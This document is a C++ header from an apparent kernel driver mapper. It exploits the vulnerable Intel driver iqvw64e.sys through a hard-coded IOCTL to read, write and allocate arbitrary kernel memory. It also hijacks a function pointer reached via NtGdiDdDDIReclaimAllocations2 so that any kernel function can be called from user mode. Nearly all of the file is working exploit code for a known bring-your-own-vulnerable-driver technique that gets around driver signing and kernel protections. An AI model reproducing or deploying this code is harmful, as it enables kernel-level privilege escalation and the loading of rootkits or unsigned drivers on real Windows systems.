#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

namespace intel_driver
{
	const std::string driver_name = "iqvw64e.sys";

	const uint32_t ioctl1 = 0x80862007;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, *PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, *PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, *PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, *PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, *PUNMAP_IO_SPACE_BUFFER_INFO;

	class Iqvw64e
	{
	public:
		bool Load();
		void Unload();
	public:
		bool ReadMemory(const uint64_t address, void* buffer, const uint64_t size);
		bool WriteMemory(const uint64_t address, void* buffer, const uint64_t size);
		bool SetMemory(const uint64_t address, const uint32_t value, const uint64_t size);
		uint64_t AllocatePool(const nt::POOL_TYPE pool_type, const uint64_t size);
		bool FreePool(const uint64_t address);
		uint64_t GetKernelModuleExport(const uint64_t kernel_module_base, const std::string &function_name);
	public:
		template<typename T, typename ...A>
		bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments)
		{
			constexpr auto call_void = std::is_same_v<T, void>;

			if constexpr (!call_void)
			{
				if (!out_result)
					return false;
			}
			else
			{
				UNREFERENCED_PARAMETER(out_result);
			}

			if (!kernel_function_address)
				return false;

			// Setup function call 

			const auto NtGdiDdDDIReclaimAllocations2 = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIReclaimAllocations2"));

			if (!NtGdiDdDDIReclaimAllocations2)
				return false;
			
			static uint64_t kernel_rax = 0;
			static uint64_t kernel_original_rax_value = 0;

			if (!kernel_rax || !kernel_original_rax_value)
			{
				if (!this->GetNtGdiDdDDIReclaimAllocations2KernelInfo(&kernel_rax, &kernel_original_rax_value))
					return false;
			}
			
			if (!this->WriteToReadOnlyMemory(kernel_rax, &kernel_function_address, sizeof(kernel_function_address)))
				return false;

			// Call function 

			if constexpr (!call_void)
			{
				using FunctionFn = T(__stdcall*)(A...);
				const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);

				*out_result = Function(arguments...);
			}
			else
			{
				using FunctionFn = void(__stdcall*)(A...);
				const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);

				Function(arguments...);
			}
			
			// Cleanup
			
			this->WriteToReadOnlyMemory(kernel_rax, &kernel_original_rax_value, sizeof(kernel_original_rax_value));
			
			return true;
		}

		bool GetNtGdiDdDDIReclaimAllocations2KernelInfo(uint64_t* out_rax, uint64_t* out_original_rax_value)
		{
			const uint64_t kernel_NtGdiDdDDIReclaimAllocations2 = this->GetKernelModuleExport(utils::GetKernelModuleAddress("win32kbase.sys"), "NtGdiDdDDIReclaimAllocations2");

			if (!kernel_NtGdiDdDDIReclaimAllocations2)
			{
				std::cout << "[-] Failed to get kernel address of NtGdiDdDDIReclaimAllocations2" << std::endl;
				return false;
			}
			
			const std::vector<uint8_t> shellcode = { 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05 };

			for (auto i = 0u; i < shellcode.size(); ++i)
			{
				uint8_t current_byte = 0;

				if (!this->ReadMemory(kernel_NtGdiDdDDIReclaimAllocations2 + i, &current_byte, sizeof(current_byte)))
					return false;

				if (current_byte != shellcode[i])
					return false;
			}

			uint32_t rax_offset = 0;

			if (!this->ReadMemory(kernel_NtGdiDdDDIReclaimAllocations2 + 0x7, &rax_offset, sizeof(rax_offset)))
				return false;

			*out_rax = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + rax_offset;

			if (!this->ReadMemory(*out_rax, out_original_rax_value, sizeof(*out_original_rax_value)))
				return false;
									
			return true;
		}

	private:
		bool CpyMemory(const uint64_t destination, const uint64_t source, const uint64_t size);
		bool WriteToReadOnlyMemory(const uint64_t address, void* buffer, const uint32_t size);
		bool GetPhysicalAddress(const uint64_t address, uint64_t* out_physical_address);
		uint64_t MapIoSpace(const uint64_t physical_address, const uint32_t size);
		bool UnmapIoSpace(const uint64_t address, const uint32_t size);
	private:
		bool Cleanup();
	private:
		std::string m_driver_path;
		HANDLE m_device_handle;
	};
}